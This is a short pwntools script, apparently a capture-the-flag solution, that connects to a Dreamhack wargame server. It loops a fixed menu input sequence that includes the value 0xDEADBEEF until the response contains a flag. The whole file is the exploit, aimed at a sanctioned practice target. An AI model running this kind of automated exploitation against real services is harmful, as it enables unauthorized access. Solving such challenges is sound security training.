from pwn import *

port = 8652
rem = remote("host3.dreamhack.games", port)

while True:
  rem.sendlineafter(b"Input: ", b"2")
  rem.sendlineafter(b"Input: ", b"1")
  rem.sendlineafter(b"Input: ", b"3735928559")
  rem.sendlineafter(b"Input: ", b"3")
  res = rem.recvline(0.5)
  if b"Flag" in res:
    print(res)
    break